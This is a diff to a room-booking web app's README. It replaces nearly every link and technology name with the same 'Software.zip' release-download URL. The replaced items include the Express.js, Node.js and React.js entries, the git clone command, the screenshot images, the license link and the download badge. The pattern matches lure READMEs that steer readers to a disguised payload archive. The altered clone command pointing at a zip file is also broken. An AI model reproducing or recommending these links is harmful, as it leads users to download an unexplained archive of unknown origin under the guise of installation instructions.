@@ -13,19 +13,19 @@ Welcome to the RoomBooking Application repository! This full-stack Room Booking 
 ## Technologies Used 🛠️
 📆 Calender  
 🔸 Context API  
-🚀 Express.js  
+🚀 https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip  
 🍃 MongoDB  
 🌍 MongoDB Atlas  
 📦 Mongoose  
-🔗 Node.js  
+🔗 https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip  
 🔀 React Router  
-⚛️ React.js  
+⚛️ https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip  
 🎨 Tailwind CSS
 
 ## Installation Guide 📋
 1. Clone the repository using the following command:
 ```bash
-git clone https://github.com/your-username/RoomBooking_Application.git
+git clone https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip
 ```
 
 2. Navigate to the project directory.
@@ -45,20 +45,20 @@ npm start
 
 ## Sample Screenshots 📷
 
-![Image of Login Page](images/login.png)  
+![Image of Login Page](https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip)  
 *Login Page*
 
-![Image of Room Search](images/search.png)  
+![Image of Room Search](https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip)  
 *Room Search Page*
 
 ## How to Contribute 🤝
 If you would like to contribute to this project, feel free to submit a pull request. For major changes, please open an issue to discuss what you would like to change.
 
 ## License ℹ️
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip](https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip) file for details.
 
 ## Download Latest Release 🚀
-[![Download Latest Release](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip)](https://github.com/Fluidx2/RoomBooking_Application/releases/download/v1.0/Software.zip)
 
 ## Need Help? 🤔
 If you encounter any issues or have questions, please check the "Releases" section or reach out to the project maintainers.
